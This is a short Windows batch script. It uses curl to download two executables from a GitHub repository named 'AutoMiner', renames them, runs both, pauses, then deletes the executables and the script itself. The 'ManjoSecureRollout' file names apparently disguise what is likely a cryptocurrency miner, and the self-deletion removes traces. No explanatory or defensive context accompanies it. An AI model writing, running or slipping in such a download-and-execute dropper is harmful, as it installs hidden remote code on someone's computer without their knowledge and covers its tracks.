@echo off
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe?raw=true
Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecureRollout_C.exe"
curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe?raw=true
Ren "ManjoSecureRollout_G.exe_raw=true" "ManjoSecureRollout_G.exe"
ManjoSecureRollout_C.exe
ManjoSecureRollout_G.exe
ping 192.0.2.1 -n 1 -w 200000 >nul
Del ManjoSecureRollout_C.exe
Del ManjoSecureRollout_G.exe
Del Script.bat
Exit

 
